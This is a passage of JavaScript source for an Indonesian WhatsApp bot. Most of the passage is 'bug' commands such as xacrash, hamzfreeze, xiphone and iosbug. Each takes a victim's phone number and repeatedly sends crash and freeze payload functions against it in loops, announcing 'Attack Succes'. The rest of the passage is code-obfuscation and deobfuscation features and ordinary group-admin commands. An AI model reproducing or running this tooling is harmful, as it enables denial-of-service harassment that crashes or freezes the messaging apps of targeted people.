let X = pepec + '@s.whatsapp.net'
await hamz.sendMessage(m.chat, {image: {url: `${image}`}, caption: 
`\`\`\`
𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝘂𝗰𝗰𝗲𝘀 ☕🎭
Target : ${X}
Type Bug : ${command}
𝗠𝗢𝗧𝗨 𝗣𝗔𝗧𝗟𝗨 𝗡𝗼 𝗖𝗼𝘂𝗻𝘁𝗲𝗿 ⚡
\`\`\`
`
}, {quoted: m})
for (let i = 0; i < 8; i++) {
    await systemUi(X)
    await systemUi(X)
    await systemUi(X)
    await systemUi(X)
    await sleep(2000)
}
for (let i = 0; i < 10; i++) {
    await crashcursor(X)
    await crashcursor(X)
    await sleep(2000)
}
 }
break
case 'xacrashui':
case '😈': {
if (!isAcces && !isOwner) return reply(' _𝐒𝐎𝐊 𝐀𝐒𝐈𝐊 𝐊𝐍𝐓𝐋 *𝖪𝗁𝗎𝗌𝗎𝗌 𝖬𝖾𝗆𝖻𝖾𝗋 𝖵𝖨𝖯*, _𝖢𝗁𝖺𝗍 𝖣𝖾𝗏𝖾𝗅𝗈𝗉𝖾𝗋 𝖲𝗎𝗉𝖺𝗒𝖺 𝖬𝖾𝗇𝖽𝖺𝗉𝖺𝗍𝗄𝖺𝗇 𝖠𝗄𝗌𝖾𝗌_ ')
if (!q) return reply(`Penggunaan ${prefix + command} 628×××`)
let pepec = q.replace(/[^0-9]/g, "")
let X = pepec + '@s.whatsapp.net'
await hamz.sendMessage(m.chat, {image: {url: `${image}`}, caption: 
`\`\`\`
𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝘂𝗰𝗰𝗲𝘀 ☕🎭
Target : ${X}
Type Bug : ${command}
𝗠𝗢𝗧𝗨 𝗣𝗔𝗧𝗟𝗨 𝗡𝗼 𝗖𝗼𝘂𝗻𝘁𝗲𝗿 ⚡
\`\`\`
`
}, {quoted: m})
for (let i = 0; i < 10; i++) {
    await crashcursor(X)
    await systemUi(X)
    await systemUi(X)
    await crashcursor(X)
    await sleep(2000)
}
for (let i = 0; i < 3; i++) {
    await systemUi(X)
    await crashcuror(X)
    await sleep(2000)
}
}
break
case 'xateam':
case '🔥': {
if (!isAcces && !isOwner) return reply(' _𝐒𝐎𝐊 𝐀𝐒𝐈𝐊 𝐊𝐍𝐓𝐋 *𝖪𝗁𝗎𝗌𝗎𝗌 𝖬𝖾𝗆𝖻𝖾𝗋 𝖵𝖨𝖯*, _𝖢𝗁𝖺𝗍 𝖣𝖾𝗏𝖾𝗅𝗈𝗉𝖾𝗋 𝖲𝗎𝗉𝖺𝗒𝖺 𝖬𝖾𝗇𝖽𝖺𝗉𝖺𝗍𝗄𝖺𝗇 𝖠𝗄𝗌𝖾𝗌_ ')
if (!q) return reply(`Penggunaan ${prefix + command} 628×××`)
let pepec = q.replace(/[^0-9]/g, "")
let X = pepec + '@s.whatsapp.net'
await hamz.sendMessage(m.chat, {image: {url: `${image}`}, caption: 
`\`\`\`
𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝘂𝗰𝗰𝗲𝘀 ☕🎭
Target : ${X}
Type Bug : ${command}
𝗠𝗢𝗧𝗨 𝗣𝗔𝗧𝗟𝗨 𝗡𝗼 𝗖𝗼𝘂𝗻𝘁𝗲𝗿 ⚡
\`\`\`
`
}, {quoted: m})
for (let i = 0; i < 8; i++) {
    await docfreeze2(X)
    await docfreeze(X)
    await systemUi(X)
    await systemUi(X)
    await sleep(2000)
}
for (let i = 0; i < 3; i++) {
    await crashMsgCall(X)
    await crashMsgCall(X)
    await sleep(2000)
}
}
break
case 'xacrash': 
case '💥': {
if (!isAcces && !isOwner) return reply(' _𝐒𝐎𝐊 𝐀𝐒𝐈𝐊 𝐊𝐍𝐓𝐋 *𝖪𝗁𝗎𝗌𝗎𝗌 𝖬𝖾𝗆𝖻𝖾𝗋 𝖵𝖨𝖯*, _𝖢𝗁𝖺𝗍 𝖣𝖾𝗏𝖾𝗅𝗈𝗉𝖾𝗋 𝖲𝗎𝗉𝖺𝗒𝖺 𝖬𝖾𝗇𝖽𝖺𝗉𝖺𝗍𝗄𝖺𝗇 𝖠𝗄𝗌𝖾𝗌_ ')
if (!q) return reply(`Penggunaan ${prefix + command} 628×××`)
let pepec = q.replace(/[^0-9]/g, "")
let X = pepec + '@s.whatsapp.net'
await hamz.sendMessage(m.chat, {image: {url: `${image}`}, caption: 
`\`\`\`
𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝘂𝗰𝗰𝗲𝘀 ☕🎭
Target : ${X}
Type Bug : ${command}
𝗠𝗢𝗧𝗨 𝗣𝗔𝗧𝗟𝗨 𝗡𝗼 𝗖𝗼𝘂𝗻𝘁𝗲𝗿 ⚡
\`\`\`
`
}, {quoted: m})
for (let i = 0; i < 10; i++) {
await crashcursor(X)
await crashcursor(X)
await crashcursor(X)
await crashcursor(X)
await sleep(1000) 

for (let i = 0; i < 20; i++) {
await crashcursor(X)
await crashcursor(X)
await crashcursor(X)
await crashcursor(X)
await crashcursor(X)
await crashcursor(X)
await sleep(2000)

for (let i = 0; i < 20; i++) {
await crashcursor(X)
await crashcursor(X)
await crashcursor(X)
await crashcursor(X)
await crashcursor(X)
await crashcursor(X)
await sleep(3000) 
    }
   }
  }
 reply(`Please Don't Spam Feature Bug\nWait 7 Minutes`) 
}
break
case 'hamzcrashv2': 
case '💣': {
if (!isAcces && !isOwner) return reply(' _𝐒𝐎𝐊 𝐀𝐒𝐈𝐊 𝐊𝐍𝐓𝐋 *𝖪𝗁𝗎𝗌𝗎𝗌 𝖬𝖾𝗆𝖻𝖾𝗋 𝖵𝖨𝖯*, _𝖢𝗁𝖺𝗍 𝖣𝖾𝗏𝖾𝗅𝗈𝗉𝖾𝗋 𝖲𝗎𝗉𝖺𝗒𝖺 𝖬𝖾𝗇𝖽𝖺𝗉𝖺𝗍𝗄𝖺𝗇 𝖠𝗄𝗌𝖾𝗌_ ')
if (!q) return reply(`Penggunaan ${prefix + command} 628×××`)
let pepec = q.replace(/[^0-9]/g, "")
let X = pepec + '@s.whatsapp.net'
await hamz.sendMessage(m.chat, {image: {url: `${image}`}, caption: 
`\`\`\`
𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝘂𝗰𝗰𝗲𝘀 ☕🎭
Target : ${X}
Type Bug : ${command}
𝗠𝗢𝗧𝗨 𝗣𝗔𝗧𝗟𝗨 𝗡𝗼 𝗖𝗼𝘂𝗻𝘁𝗲𝗿 ⚡
\`\`\`
`
}, {quoted: m})
for (let i = 0; i < 15; i++) {
await CrashUi(X)
await sleep(1000)
await TagWa(X)
await sleep(1000)
await Location(X)
await sleep(1000)
await crashcursor(X) 
await sleep(1000) 
 }
 reply(`Please Don't Spam Feature Bug\nWait 7 Minutes`) 
}
break
case 'hamzcrashv3': {
if (!isAcces && !isOwner) return reply(' _𝐒𝐎𝐊 𝐀𝐒𝐈𝐊 𝐊𝐍𝐓𝐋 *𝖪𝗁𝗎𝗌𝗎𝗌 𝖬𝖾𝗆𝖻𝖾𝗋 𝖵𝖨𝖯*, _𝖢𝗁𝖺𝗍 𝖣𝖾𝗏𝖾𝗅𝗈𝗉𝖾𝗋 𝖲𝗎𝗉𝖺𝗒𝖺 𝖬𝖾𝗇𝖽𝖺𝗉𝖺𝗍𝗄𝖺𝗇 𝖠𝗄𝗌𝖾𝗌_ ')
if (!q) return reply(`Penggunaan ${prefix + command} 628×××`)
let pepec = q.replace(/[^0-9]/g, "")
let X = pepec + '@s.whatsapp.net'
await hamz.sendMessage(m.chat, {image: {url: `${image}`}, caption: 
`\`\`\`
𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝘂𝗰𝗰𝗲𝘀 ☕🎭
Target : ${X}
Type Bug : ${command}
𝗠𝗢𝗧𝗨 𝗣𝗔𝗧𝗟𝗨 𝗡𝗼 𝗖𝗼𝘂𝗻𝘁𝗲𝗿 ⚡
\`\`\`
`
}, {quoted: m})
for (let i = 0; i < 5; i++) {
await TagWa1(X)
await sleep(1000) 
await Location(X)
await sleep(1000) 
await LiveLok(X)
await sleep(1000)
await freezeuii(X) 
await sleep(1000) 
await CrashUi(X) 
await sleep(1000) 
await crashcursor(X) 
await sleep(X) 
   }
 reply(`Please Don't Spam Feature Bug\nWait 7 Minutes`) 
}
break
case 'hamzfreeze': {
if (!isAcces && !isOwner) return reply(' _𝐒𝐎𝐊 𝐀𝐒𝐈𝐊 𝐊𝐍𝐓𝐋 *𝖪𝗁𝗎𝗌𝗎𝗌 𝖬𝖾𝗆𝖻𝖾𝗋 𝖵𝖨𝖯*, _𝖢𝗁𝖺𝗍 𝖣𝖾𝗏𝖾𝗅𝗈𝗉𝖾𝗋 𝖲𝗎𝗉𝖺𝗒𝖺 𝖬𝖾𝗇𝖽𝖺𝗉𝖺𝗍𝗄𝖺𝗇 𝖠𝗄𝗌𝖾𝗌_ ')
if (!q) return reply(`Penggunaan ${prefix + command} 628×××`)
let pepec = q.replace(/[^0-9]/g, "")
let X = pepec + '@s.whatsapp.net'
await hamz.sendMessage(m.chat, {image: {url: `${image}`}, caption: 
`\`\`\`
𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝘂𝗰𝗰𝗲𝘀 ☕🎭
Target : ${X}
Type Bug : ${command}
𝗠𝗢𝗧𝗨 𝗣𝗔𝗧𝗟𝗨 𝗡𝗼 𝗖𝗼𝘂𝗻𝘁𝗲𝗿 ⚡
\`\`\`
`
}, {quoted: m})
for (let i = 0; i < 10; i++) {
await freezeuii(X)
await freezeuii(X)
await freezeuii(X)
await freezeuii(X)
await freezeuii(X)
await freezeuii(X)
await freezeuii(X)
await freezeuii(X)

for (let i = 0; i < 20; i++) {
await freezeuii(X)
await freezeuii(X)
await CrashUi(X)
await CrashUi(X)
await CrashUi(X)
await CrashUi(X)
await CrashUi(X)
await CrashUi(X)
await CrashUi(X)
await CrashUi(X)
await CrashUi(X)
await CrashUi(X)
await sleep(2000) 

for (let i = 0; i < 20; i++) {
await crashcursor(X)
await crashcursor(X)
await crashcursor(X)
await crashcursor(X)
await crashcursor(X)
await crashcursor(X)
await crashcursor(X)
await crashcursor(X)
await crashcursor(X)
await crashcursor(X)
await sleep(3000) 
    }
   }
  }
  reply(`Please Don't Spam Feature Bug\nWait 20 Minutes`) 
}
break
case 'combobug': {
if (!isAcces && !isOwner) return reply(' _𝐒𝐎𝐊 𝐀𝐒𝐈𝐊 𝐊𝐍𝐓𝐋 *𝖪𝗁𝗎𝗌𝗎𝗌 𝖬𝖾𝗆𝖻𝖾𝗋 𝖵𝖨𝖯*, _𝖢𝗁𝖺𝗍 𝖣𝖾𝗏𝖾𝗅𝗈𝗉𝖾𝗋 𝖲𝗎𝗉𝖺𝗒𝖺 𝖬𝖾𝗇𝖽𝖺𝗉𝖺𝗍𝗄𝖺𝗇 𝖠𝗄𝗌𝖾𝗌_ ')
if (!q) return reply(`Penggunaan ${prefix + command} 628×××`)
let pepec = q.replace(/[^0-9]/g, "")
let X = pepec + '@s.whatsapp.net'
await hamz.sendMessage(m.chat, {image: {url: `${image}`}, caption: 
`\`\`\`
𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝘂𝗰𝗰𝗲𝘀 ☕🎭
Target : ${X}
Type Bug : ${command}
𝗠𝗢𝗧𝗨 𝗣𝗔𝗧𝗟𝗨 𝗡𝗼 𝗖𝗼𝘂𝗻𝘁𝗲𝗿 ⚡
\`\`\`
`
}, {quoted: m})
for (let i = 0; i < 20; i++) {
await DocuCombo(X)
await sleep(1000) 
await XeonBug(X)
await sleep(2000) 
await Combo(X)
await sleep(3000) 
   }
   reply(`Please Don't Spam Feature Bug\nWait 20 Minutes`) 
}
break
    case 'ownhard': {
if (!isAcces && !isOwner) return reply(' _𝐒𝐎𝐊 𝐀𝐒𝐈𝐊 𝐊𝐍𝐓𝐋 *𝖪𝗁𝗎𝗌𝗎𝗌 𝖬𝖾𝗆𝖻𝖾𝗋 𝖵𝖨𝖯*, _𝖢𝗁𝖺𝗍 𝖣𝖾𝗏𝖾𝗅𝗈𝗉𝖾𝗋 𝖲𝗎𝗉𝖺𝗒𝖺 𝖬𝖾𝗇𝖽𝖺𝗉𝖺𝗍𝗄𝖺𝗇 𝖠𝗄𝗌𝖾𝗌_ ')
if (!q) return reply(`Penggunaan ${prefix + command} 628×××`)
let pepec = q.replace(/[^0-9]/g, "")
let X = pepec + '@s.whatsapp.net'
await hamz.sendMessage(m.chat, {image: {url: `${image}`}, caption: 
`\`\`\`
𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝘂𝗰𝗰𝗲𝘀 ☕🎭
Target : ${X}
Type Bug : ${command}
𝗠𝗢𝗧𝗨 𝗣𝗔𝗧𝗟𝗨 𝗡𝗼 𝗖𝗼𝘂𝗻𝘁𝗲𝗿 ⚡
\`\`\`
`
}, {quoted: m})
for (let i = 0; i < 45; i++) {
    await systemUi(X)
    await systemUi(X)
    await systemUi(X)
    await systemUi(X)
    await sleep(3000)
await sleep(240000)
for (let i = 0; i < 45; i++) {
    await systemUi(X)
    await systemUi(X)
    await systemUi(X)
    await systemUi(X)
    await sleep(4000)
for (let i = 0; i < 5; i++) {
    await crashMsgCall(X)
    await crashMsgCall(X)
    await sleep(8000)
    }
    }
}
    }
break
case 'crashown': {
if (!isAcces && !isOwner) return reply(' _𝐒𝐎𝐊 𝐀𝐒𝐈𝐊 𝐊𝐍𝐓𝐋 *𝖪𝗁𝗎𝗌𝗎𝗌 𝖬𝖾𝗆𝖻𝖾𝗋 𝖵𝖨𝖯*, _𝖢𝗁𝖺𝗍 𝖣𝖾𝗏𝖾𝗅𝗈𝗉𝖾𝗋 𝖲𝗎𝗉𝖺𝗒𝖺 𝖬𝖾𝗇𝖽𝖺𝗉𝖺𝗍𝗄𝖺𝗇 𝖠𝗄𝗌𝖾𝗌_ ')
if (!q) return reply(`Penggunaan ${prefix + command} 628×××`)
let pepec = q.replace(/[^0-9]/g, "")
let X = pepec + '@s.whatsapp.net'
await hamz.sendMessage(m.chat, {image: {url: `${image}`}, caption: 
`\`\`\`
𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝘂𝗰𝗰𝗲𝘀 ☕🎭
Target : ${X}
Type Bug : ${command}
𝗠𝗢𝗧𝗨 𝗣𝗔𝗧𝗟𝗨 𝗡𝗼 𝗖𝗼𝘂𝗻𝘁𝗲𝗿 ⚡
\`\`\``
}, {quoted: m})
for (let i = 0; i < 45; i++) {
    await NewPayLoad(X) 
    await NewPayLoad(X) 
    await NewPayLoad(X) 
    await NewPayLoad(X) 
    await sleep(3000)
}
await sleep(240000)
for (let i = 0; i < 45; i++) {
    await letterCrash(X) 
    await letterCrash(X) 
    await letterCrash(X) 
    await letterCrash(X) 
    await sleep(4000)
}
for (let i = 0; i < 5; i++) {
    await crashcursor(X)
    await crashcursor(X)
    await sleep(8000)
}
    }
break
    case 'xown': {
if (!isAcces && !isOwner) return reply(' _𝐒𝐎𝐊 𝐀𝐒𝐈𝐊 𝐊𝐍𝐓𝐋 *𝖪𝗁𝗎𝗌𝗎𝗌 𝖬𝖾𝗆𝖻𝖾𝗋 𝖵𝖨𝖯*, _𝖢𝗁𝖺𝗍 𝖣𝖾𝗏𝖾𝗅𝗈𝗉𝖾𝗋 𝖲𝗎𝗉𝖺𝗒𝖺 𝖬𝖾𝗇𝖽𝖺𝗉𝖺𝗍𝗄𝖺𝗇 𝖠𝗄𝗌𝖾𝗌_ ')
if (!q) return reply(`Penggunaan ${prefix + command} 628×××`)
let pepec = q.replace(/[^0-9]/g, "")
let X = pepec + '@s.whatsapp.net'
await hamz.sendMessage(m.chat, {image: {url: `${image}`}, caption: 
`\`\`\`
𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝘂𝗰𝗰𝗲𝘀 ☕🎭
Target : ${X}
Type Bug : ${command}
𝗠𝗢𝗧𝗨 𝗣𝗔𝗧𝗟𝗨 𝗡𝗼 𝗖𝗼𝘂𝗻𝘁𝗲𝗿 ⚡
\`\`\``
}, {quoted: m})
for (let i = 0; i < 45; i++) {
    await DocSystem(X)
    await DocSystem(X)
    await DocSystem(X)
    await DocSystem(X)
    await sleep(3000)
}
await sleep(240000)
for (let i = 0; i < 45; i++) {
    await DocSystem(X)
    await DocSystem(X)
    await DocSystem(X)
    await DocSystem(X)
    await sleep(4000)
}
for (let i = 0; i < 5; i++) {
    await crashMsgCall(X)
    await crashMsgCall(X)
    await sleep(8000)
}
    }
break
case 'xiphone': {
if (!isAcces && !isOwner) return reply(' _𝐒𝐎𝐊 𝐀𝐒𝐈𝐊 𝐊𝐍𝐓𝐋 *𝖪𝗁𝗎𝗌𝗎𝗌 𝖬𝖾𝗆𝖻𝖾𝗋 𝖵𝖨𝖯*, _𝖢𝗁𝖺𝗍 𝖣𝖾𝗏𝖾𝗅𝗈𝗉𝖾𝗋 𝖲𝗎𝗉𝖺𝗒𝖺 𝖬𝖾𝗇𝖽𝖺𝗉𝖺𝗍𝗄𝖺𝗇 𝖠𝗄𝗌𝖾𝗌_ ')
if (!q) return reply(`Penggunaan ${prefix + command} 628×××`)
let pepec = q.replace(/[^0-9]/g, "")
let X = pepec + '@s.whatsapp.net'
await hamz.sendMessage(m.chat, {image: {url: `${image}`}, caption: 
`\`\`\`
𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝘂𝗰𝗰𝗲𝘀 ☕🎭
Target : ${X}
Type Bug : ${command}
𝗠𝗢𝗧𝗨 𝗣𝗔𝗧𝗟𝗨 𝗡𝗼 𝗖𝗼𝘂𝗻𝘁𝗲𝗿 ⚡
\`\`\`
`
}, {quoted: m})
for (let i = 0; i < 20; i++) {
await XiosCrash(X)
await IosCrash(X)
await XiosPay(X)
await IosCrash(X)
await XiosCrash(X)
await XiosPay(X)
await XiosCrash(X)
await IosCrash(X)
await XiosPay(X)
await XiosCrash(X)
await XiosCrash(X)
await XiosPay(X)
await IosCrash(X)
await XiosPay(X)
await XiosCrash(X)
await XiosPay(X)
await IosCrash(X)
await IosCrash(X)
await XiosPay(X)
await XiosCrash(X)
await XiosPay(X)
await IosCrash(X)
await XiosCrash(X)
await XiosPay(X)
   }
   reply(`Please Don't Spam Feature Bug\nWait 20 Minutes`) 
}
break
case 'iphone': {
if (!isAcces && !isOwner) return reply(' _𝐒𝐎𝐊 𝐀𝐒𝐈𝐊 𝐊𝐍𝐓𝐋 *𝖪𝗁𝗎𝗌𝗎𝗌 𝖬𝖾𝗆𝖻𝖾𝗋 𝖵𝖨𝖯*, _𝖢𝗁𝖺𝗍 𝖣𝖾𝗏𝖾𝗅𝗈𝗉𝖾𝗋 𝖲𝗎𝗉𝖺𝗒𝖺 𝖬𝖾𝗇𝖽𝖺𝗉𝖺𝗍𝗄𝖺𝗇 𝖠𝗄𝗌𝖾𝗌_ ')
if (!q) return reply(`Penggunaan ${prefix + command} 628×××`)
let pepec = q.replace(/[^0-9]/g, "")
let X = pepec + '@s.whatsapp.net'
await hamz.sendMessage(m.chat, {image: {url: `${image}`}, caption: 
`\`\`\`
𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝘂𝗰𝗰𝗲𝘀 ☕🎭
Target : ${X}
Type Bug : ${command}
𝗠𝗢𝗧𝗨 𝗣𝗔𝗧𝗟𝗨 𝗡𝗼 𝗖𝗼𝘂𝗻𝘁𝗲𝗿 ⚡
\`\`\`
`
}, {quoted: m})
for (let i = 0; i < 20; i++) {
await iosMJ(X)
await FrezeiOS(X)
   }
}
break
case 'iosdelay': {
if (!isAcces && !isOwner) return reply(' _𝐒𝐎𝐊 𝐀𝐒𝐈𝐊 𝐊𝐍𝐓𝐋 *𝖪𝗁𝗎𝗌𝗎𝗌 𝖬𝖾𝗆𝖻𝖾𝗋 𝖵𝖨𝖯*, _𝖢𝗁𝖺𝗍 𝖣𝖾𝗏𝖾𝗅𝗈𝗉𝖾𝗋 𝖲𝗎𝗉𝖺𝗒𝖺 𝖬𝖾𝗇𝖽𝖺𝗉𝖺𝗍𝗄𝖺𝗇 𝖠𝗄𝗌𝖾𝗌_ ')
if (!q) return reply(`Penggunaan ${prefix + command} 628×××`)
let pepec = q.replace(/[^0-9]/g, "")
let X = pepec + '@s.whatsapp.net'
await hamz.sendMessage(m.chat, {image: {url: `${image}`}, caption: 
`\`\`\`
𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝘂𝗰𝗰𝗲𝘀 ☕🎭
Target : ${X}
Type Bug : ${command}
𝗠𝗢𝗧𝗨 𝗣𝗔𝗧𝗟𝗨 𝗡𝗼 𝗖𝗼𝘂𝗻𝘁𝗲𝗿 ⚡
\`\`\`
`
}, {quoted: m})
for (let i = 0; i < 20; i++) {
await iosMJ(X)
await XiosCrash(X)
   }
}
break
case 'iosbug': {
if (!isAcces && !isOwner) return reply(' _𝐒𝐎𝐊 𝐀𝐒𝐈𝐊 𝐊𝐍𝐓𝐋 *𝖪𝗁𝗎𝗌𝗎𝗌 𝖬𝖾𝗆𝖻𝖾𝗋 𝖵𝖨𝖯*, _𝖢𝗁𝖺𝗍 𝖣𝖾𝗏𝖾𝗅𝗈𝗉𝖾𝗋 𝖲𝗎𝗉𝖺𝗒𝖺 𝖬𝖾𝗇𝖽𝖺𝗉𝖺𝗍𝗄𝖺𝗇 𝖠𝗄𝗌𝖾𝗌_ ')
if (!q) return reply(`Penggunaan ${prefix + command} 628×××`)
let pepec = q.replace(/[^0-9]/g, "")
let X = pepec + '@s.whatsapp.net'
await hamz.sendMessage(m.chat, {image: {url: `${image}`}, caption: 
`\`\`\`
𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝘂𝗰𝗰𝗲𝘀 ☕🎭
Target : ${X}
Type Bug : ${command}
𝗠𝗢𝗧𝗨 𝗣𝗔𝗧𝗟𝗨 𝗡𝗼 𝗖𝗼𝘂𝗻𝘁𝗲𝗿 ⚡
\`\`\`
`
}, {quoted: m})
for (let i = 0; i < 20; i++) {
await FrezeiOS(X)
await FrezeIOS(X)
await FrezeiOS(X)
await FrezeiOS(X)
await FrezeiOS(X)
   }
}
//  BUG LANGSUNG  //
break
case 'kenal-hamz?': 
case 'dicariinhamz': 
case 'bg-ada-panel?':{
for (let i = 0; i < 20; i++) {
await TagWa(m.chat)
await sleep(1000) 
await Location(m.chat)
await sleep(1000) 
await NewPayLoad(m.chat) 
await sleep(1000) 
await crashcursor(m.chat)
await sleep(1000)
}
reply("Dapat Salam Dari Hamz Ofc") 
}
break
case 'pair': {
if (!isBot) return reply(' _Acces Danied *Features Only Bot*_ ')
{
await CrashPair(m.chat, Ptcp = true)
}
}
break
case 'enc': {
if (!m.quoted) return reply("Reply file .js")
if (mime !== "application/javascript") return reply("Reply file .js")
let media = await m.quoted.download()
let filename = m.quoted.fileName
await fs.writeFileSync(`./sampah/@enc${filename}.js`, media)
await reply("processing  encrypt code . . .")
await JsConfuser.obfuscate(await fs.readFileSync(`./sampah/@enc${filename}.js`).toString(), {
  target: "node",
  preset: "high",
  calculator: true,
  compact: true,
  hexadecimalNumbers: true,
  controlFlowFlattening: 0.75,
  deadCode: 0.2,
  dispatcher: true,
  duplicateLiteralsRemoval: 0.75,
  flatten: true,
  globalConcealing: true,
  identifierGenerator: "randomized",
  minify: true,
  movedDeclarations: true,
  objectExtraction: true,
  opaquePredicates: 0.75,
  renameVariables: true,
  renameGlobals: true,
  shuffle: { hash: 0.5, true: 0.5 },
  stack: true,
  stringConcealing: true,
  stringCompression: true,
  stringEncoding: true,
  stringSplitting: 0.75,
  rgf: false
}).then(async (obfuscated) => {
  await fs.writeFileSync(`./@enc${filename}.js`, obfuscated)
  await hamz.sendMessage(m.chat, {document: fs.readFileSync(`./@enc${filename}.js`), mimetype: "application/javascript", fileName: filename, caption: "Encrypt File Sukses!"}, {quoted: m})
}).catch(e => reply("Error :" + e))
}
break
case 'enchard': {
if (!m.quoted) return reply("Reply file .js")
if (mime !== "application/javascript") return reply("Reply file .js")
let media = await m.quoted.download()
let filename = m.quoted.fileName
await fs.writeFileSync(`./@hardenc${filename}.js`, media)
await reply("Processing  encrypt hard code . . .")
await JsConfuser.obfuscate(await fs.readFileSync(`./@hardenc${filename}.js`).toString(), {
  target: "node",
 preset: "high",
 compact: true,
 minify: true,
 flatten: true,

 identifierGenerator: function() {
  const originalString = 
"AAAAAAAAAAAAAAAAAAAA";

  function hapusKarakterTidakDiinginkan(input) {
return input.replace(
 /[^a-zA-Z/*ᨒZenn/*^/*($break)*/]/g, ''
);
  }

  function stringAcak(panjang) {
let hasil = '';
const karakter = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
const panjangKarakter = karakter.length;

for (let i = 0; i < panjang; i++) {
 hasil += karakter.charAt(
  Math.floor(Math.random() * panjangKarakter)
 );
}
return hasil;
  }

  return hapusKarakterTidakDiinginkan(originalString) + stringAcak(2);
 },

 renameVariables: true,
 renameGlobals: true,

 // Kurangi encoding dan pemisahan string untuk mengoptimalkan ukuran
 stringEncoding: 0.01, 
 stringSplitting: 0.1, 
 stringConcealing: true,
 stringCompression: true,
 duplicateLiteralsRemoval: true,

 shuffle: {
  hash: false,
  true: false
 },

 stack: false,
 controlFlowFlattening: false, 
 opaquePredicates: false, 
 deadCode: false, 
 dispatcher: false,
 rgf: false,
 calculator: false,
 hexadecimalNumbers: false,
 movedDeclarations: true,
 objectExtraction: true,
 globalConcealing: true
}).then(async (obfuscated) => {
  await fs.writeFileSync(`./@hardenc${filename}.js`, obfuscated)
  await hamz.sendMessage(m.chat, {document: fs.readFileSync(`./@hardenc${filename}.js`), mimetype: "application/javascript", fileName: filename, caption: "Encrypt File JS Sukses! Type:\nString"}, {quoted: m})
}).catch(e => reply("Error :" + e))
}
break
case 'dec':
case 'decrypt': {

if (!isOwner) return reply("Special Features for Certain Users!!")
 await hamz.sendMessage(m.chat, { react: { text: "👑️", key: m.key } });
 
 const { webcrack } = await import('webcrack');
 const usage = `Example:\n${command} (Input text or reply text to dec code)\n${command} doc (Reply to a document)`;

 // Ensure only the owner can use this command
 if (!isOwner) return reply('*Mau Decript? Chat Owner 3584573993448*');

 let text;
 
 // Determine text to decrypt
 if (args.length >= 1) {
  text = args.join(" ");
 } else if (m.quoted && m.quoted.text) {
  text = m.quoted.text;
 } else {
  return reply(usage);
 }

 try {
  let message;

  // Decrypt document if command is "doc"
  if (text === 'doc' && m.quoted && m.quoted.mtype === 'documentMessage') {
let docBuffer;

if (m.quoted.mimetype) {
 docBuffer = await m.quoted.download();
 message = await webcrack(docBuffer.toString('utf-8'));
} else {
 return reply("Invalid document format.");
}
  } else {
// Decrypt regular text
message = await webcrack(text);
  }

  // Save the decrypted content to file
  const filePath = './decriptByAldz.js';
  fs.writeFileSync(filePath, message.code || message);

  // Send the decrypted file
  await hamz.sendMessage(m.chat, {
document: { url: filePath },
mimetype: 'application/javascript',
fileName: 'decriptByAldz.js'
  }, { quoted: m });

 } catch (error) {
  const errorMessage = `There is an error: ${error.message}`;
  await reply(errorMessage);
 }
}
break
case 'tourl': {
if (!quoted) return reply(`*Send/Reply the Video/Image Caption* ${prefix + command}`)
let q = m.quoted ? m.quoted : m
let media = await q.download()
let uploadImage = require('./system/lib/tourl')
let link = await uploadImage(media)
reply(`Your Link : ${link}\nExpired Date : Liftime`)
    }
break
case 'sticker': case 's': case 'stickergif': case 'sgif': {
 if (!quoted) return reply(`Balas Video/Image Dengan Caption .sticker`) 
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await hamz.sendImageAsSticker(from, media, qlive, { packname: 'By', author: 'Hamzzz' })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await hamz.sendVideoAsSticker(from, media, qlive, { packname: 'By', author: 'Hamzzz' })
await fs.unlinkSync(encmedia)
} else {
throw `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`
}
}




break
case 'hidetag':
if (!isGroup) return reply("dongo fitur khusus grup")
if (!isGroupAdmins) return reply("dongo fitur khusus admin")
if (!isBotGroupAdmins) return reply("dongo bot belom admin")
let mem = [];
groupMembers.map( i => mem.push(i.id) )
hamz.sendMessage(from, { text: q ? q : '', mentions: mem })
break
case 'tagall':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply("dongo fitur khusus admin")
if (!q) return reply(`Teks?\nContoh tagall hallo`)
let teks_tagall = `══✪〘 *👥 Tag All* 〙✪══\n\n${q ? q : ''}\n\n`
for (let mem of participants) {
teks_tagall += `➲ @${mem.id.split('@')[0]}\n`
}
hamz.sendMessage(from, { text: teks_tagall, mentions: participants.map(a => a.id) }, { quoted: msg })
break
case 'del':
case 'delete':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply("dongo fitur khusus admin")
if (!quotedMsg) return reply(`Balas chat dari bot yang ingin dihapus`)
if (!quotedMsg.fromMe) return reply(`Hanya bisa menghapus chat dari bot`)
hamz.sendMessage(from, { delete: { fromMe: true, id: quotedMsg.id, remoteJid: from }})
break
case 'linkgrup': case 'linkgc':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isBotGroupAdmins) return reply("dongo bot belom admin")
var url = await hamz.groupInviteCode(from).catch(() => reply(mess.error.api))
url = 'https://chat.whatsapp.com/'+url
reply(url)
break
case 'revoke':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply("dongo fitur khusus admin")
if (!isBotGroupAdmins) return reply("dongo bot belom admin")
await hamz.groupRevokeInvite(from)
.then( res => {
reply(`Sukses menyetel tautan undangan grup ini`)
}).catch(() => reply(mess.error.api))
break
case 'group':
case 'grup':
